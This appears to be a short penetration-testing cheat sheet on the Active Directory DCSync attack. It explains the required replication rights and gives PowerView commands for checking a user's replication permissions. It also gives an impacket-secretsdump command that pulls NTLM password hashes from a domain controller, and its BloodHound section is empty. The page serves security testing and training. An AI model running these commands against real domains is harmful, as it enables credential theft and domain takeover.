# DS-Replication-Get-Changes and DS-Replication-Get-Changes-All (Extended Right) **DCSync attack**
**DCSync** is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
- To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions set).
- Domain/Enterprise Admins and default domain administrators have this right by default.
## Check user's Replication Rights
### Using PowerView
1. Identify the target user and verify their group memberships
```powershell
Get-DomainUser -Identity <user> | Select-Object samaccountname, objectsid, memberof, useraccountcontrol | Format-List
```
2. Verify Replication Rights
```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"  # Replace with the actual SID
Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
    Where-Object { $_.SecurityIdentifier -match $sid } |
    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
    Format-List
```
<img width="1443" height="115" alt="image" src="https://github.com/user-attachments/assets/be6df894-74e1-44c5-9e06-c1ed39261fc3" />

### Using BloodHound


## DCSync Attack from Linux (Non-Domain Machine)

```shell
impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
```
